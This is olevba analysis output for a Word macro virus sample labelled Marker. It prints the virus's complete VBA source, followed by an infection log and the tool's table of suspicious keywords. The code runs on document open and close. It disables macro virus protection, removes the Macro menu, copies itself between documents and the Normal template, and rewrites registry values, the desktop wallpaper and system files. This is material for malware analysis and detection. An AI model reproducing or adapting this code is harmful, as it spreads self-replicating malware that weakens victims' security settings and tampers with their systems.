olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.db-6494b1ce22e8390da117f36c13c653c8043b15aa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.db-6494b1ce22e8390da117f36c13c653c8043b15aa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Son, Be a Good Boy !
Const Marker = "<- this is a marker! by fs2000"
Private Sub Document_Open()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 1 Then
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = 0
        CommandBars("Tools").Controls("Macro").Delete
    Else
        CommandBars("Tools").Controls("Macro").Delete
    End If
    Options.VirusProtection = False
    If Month(Now) = 1 And Day(Now) < 10 Then Message$ = "HaPpy NeW YeaR ! From : «(¤¿¤)» Me !"
        If Day(Now) = ((64 / 8) - 2 + 10 - (6 + 2)) And Month(Now) = ((30 / 6) + (4 / 2) + 4 - 5) Then Message$ = "Today Is My Birthday ! Thank's For Your Greeting..."
            If Day(Now) = ((25 / 5) - 2 + 10 + 14) And Month(Now) = (2 ^ 5) - 30 + 5 Then Message$ = "Happy Birthday Honey, I Love U So Much..."
                If Day(Now) = (3 ^ 6) - 700 + (2 ^ 3) - 22 And Month(Now) = (5 ^ 3) - 120 + 7 Then Message$ = "Happy Birthday, Son ! Be a Good Boy..."
                    If Message$ <> "" Then MsgBox Message$, vbInformation, "From : <(¤¿¤)>"
    Message$ = ""
    Document_Close
End Sub
Private Sub Document_Close()
    Dim nmod As Object
    Dim isd As String
    Dim DS, NTS, DI, NTI As Boolean
    Dim EmailMe, Users, LogData, LogFile As String
    On Error Resume Next
    AddIns.Unload True
    Application.UserName = "fs080298"
    Application.UserInitials = "FS2000"
    Application.UserAddress = "fs080298@yeayea.com"
    Application.EnableCancelKey = wdCancelDisabled
    GoSub Sisipin
    If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
    "LogData in") = False) Then GoSub LoggingIn
    GoSub EmailMePlease
    GoTo Finish
    
Sisipin:
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
        If DI Then
            NTS = NormalTemplate.Saved
            EmailMe = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
        For i = 1 To Len(Application.UserAddress)
            If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
                If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
                    Users = Users & Mid(Application.UserAddress, i, 1)
                End If
            Else
                Users = Users & Chr(13) & " '"
            End If
        Next
    EmailMe = EmailMe & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
    NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
    NT.CodeModule.AddFromString EmailMe
    If NTS Then NormalTemplate.Save
    End If
    If NTI Then
        DS = ActiveDocument.Saved
        EmailMe = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
        AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
        AD.CodeModule.AddFromString EmailMe
        If DS Then ActiveDocument.Save
        End If
    End If
    Return
    
LoggingIn:
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
    GoSub EmailMePlease
    Return

EmailMePlease:
    Dim SystemRoot As String
    On Error Resume Next
    SystemRoot = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s1159") = Chr$(60) + Chr$(40) + Chr$(164) + Chr$(191) + Chr$(164) + Chr$(41) + Chr$(62)
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "sTimeFormat") = "HH:mm:ss tt"
                System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductName") = "FS080298"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "FaN's Comp. 2000"
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Hi ! <(¤¿¤)> It's Me !"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductId") = "Feb 8, 1998 -> Dec 15, 1998"
    Open SystemRoot & "\EmailMe.html" For Output As #1
        Print #1, "<html><head><title>Email Me !</title></head><body bgcolor='#000000' link='#FFFF00' vlink='#00FFFF'>"
        Print #1, "<p align='right'><font color='#80FF00' size='3' face='Arial'><marquee scrollamount='3' width='53%'> © Have a Nice Day ! - Don't Forget to Save Your Data...</marquee></font></p>"
        Print #1, "<h6 align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
        Print #1, "<p align='center'><font color='#FF80FF' size='7'><marquee behavior='alternate' width='11%'>ÒÓ</marquee></font>"
        Print #1, "<p align='center'><font color='#FF80FF' size='7'><strong>¯</strong></font></p>"
        Print #1, "<p align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
        Print #1, "<p><br><br><br><br><br></p>"
        Print #1, "<p align='right'><a href='mailto:fs080298@yeayea.com'><font size='2'>Email Me !</font></a></p></Body></html>"
        Print #1, "<Script Language='VBS'>"
        Print #1, "Sub button1_onClick()"
        Print #1, "alert " + Chr$(34) + "I Said : Don`t Press Me ! Can`t You Read ?" + Chr$(34)
        Print #1, "End Sub"
        Print #1, "</script>"
        Print #1, "<p align='right'><INPUT TYPE='BUTTON' NAME='Button1' VALUE='Don`t Press Me !'></p>"
    Close #1
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = SystemRoot & "\EmailMe.html"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s2359") = Chr$(60) + Chr$(40) + Chr$(169) + Chr$(191) + Chr$(169) + Chr$(41) + Chr$(62)
        If System.Version = 4.1 Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = Chr$(72) + Chr$(105) + Chr$(32) + Chr$(33) + Chr$(32) + Chr$(72) + Chr$(111) + Chr$(119) + Chr$(32) + Chr$(65) + Chr$(114) + Chr$(101) + Chr$(32) + Chr$(89) + Chr$(111) + Chr$(117) + Chr$(32) + Chr$(84) + Chr$(111) + Chr$(100) + Chr$(97) + Chr$(121) + Chr$(46) + Chr$(46) + Chr$(46)
            System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "InfoTip") = "Hi ! «(¤¿¤)» Have a Nice Day..."
        Else
            System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = Chr$(72) + Chr$(105) + Chr$(32) + Chr$(33) + Chr$(32) + Chr$(72) + Chr$(111) + Chr$(119) + Chr$(32) + Chr$(65) + Chr$(114) + Chr$(101) + Chr$(32) + Chr$(89) + Chr$(111) + Chr$(117) + Chr$(32) + Chr$(84) + Chr$(111) + Chr$(100) + Chr$(97) + Chr$(121) + Chr$(46) + Chr$(46) + Chr$(46)
        End If
    myoem = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot") + Chr$(92) + Chr$(83) + Chr$(121) + Chr$(115) + Chr$(116) + Chr$(101) + Chr$(109)
    myini$ = Chr$(92) + Chr$(79) + Chr$(101) + Chr$(109) + Chr$(105) + Chr$(110) + Chr$(102) + Chr$(111) + Chr$(46) + Chr$(105) + Chr$(110) + Chr$(105)
    Open myoem & myini$ For Output As #2
        Print #2, "[general]"
        Print #2, "Manufacturer=FS080298 CORP. 98"
        Print #2, "Model=Son, I Love You So Much !"
        Print #2, ""
        Print #2, "[Support Information]"
        Print #2, "Line1=THank`s For Looking My Wallpaper (Win98x Only)"
        Print #2, "Line2=My Program Is Not DANGER !"
        Print #2, "Line3=Don`t Worry !!!"
        Print #2, "Line4="
        Print #2, "Line5=Do You Have Any Comments ?"
        Print #2, "Line6=Please Send Your Email to : fs080298@yeayea.com"
        Print #2, "Line7=:-)"
    Close #2
Return
Finish:
End Sub

'THank's 4 Looking My Wallpaper (Win98x Only)
'Log File ->

' 07:03:2007:03:20 <(¤¿¤)> <(¤¿¤)>-Thursday, 16 Dec 1999
' fs080298
' fs080298@yeayea.com

 


' 09:22:539:22:53 Sore Sore-Wednesday, 22 Dec 1999
' fs080298
' fs080298@yeayea.com

 


' 08:26:528:26:52 -Minggu, 26 Des 1999
' fs080298
' fs080298@yeayea.com

 


' 08:12:458:12:45 PM PM-Monday, 27 Dec 1999
' fs080298
' fs080298@yeayea.com

 


' 02:28:132:28:13 PM PM-Tuesday, 4 Jan 2000
' fs080298
' fs080298@yeayea.com

 


' 04:56:84:56:08 PM PM-Wednesday, 26 Jan 2000
' fs080298
' fs080298@yeayea.com

 


' 04:26:94:26:09 PM PM-Saturday, 29 Jan 2000
' fs080298
' fs080298@yeayea.com

 


' 10:09:2310:09:23 AM AM-Monday, 31 Jan 2000
' fs080298
' fs080298@yeayea.com

 


' 09:33:149:33:14 AM AM-Tuesday, 1 Feb 2000
' fs080298
' fs080298@yeayea.com

 


' 01:41:11:41:01 PM PM-Thursday, 24 Feb 2000
' fs080298
' fs080298@yeayea.com

 


' 03:56:33:56:03 PM PM-Friday, 25 Feb 2000
' fs080298
' fs080298@yeayea.com

 


' 10:54:5910:54:59 AM AM-Tuesday, 29 Feb 2000
' fs080298
' fs080298@yeayea.com

 


' 06:36:466:36:46 PM PM-Tuesday, 29 Feb 2000
' fs080298
' fs080298@yeayea.com

 


' 11:42:3623:42:36 -Donnerstag, 1 Jun 2000
' fs080298
' fs080298@yeayea.com

 


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

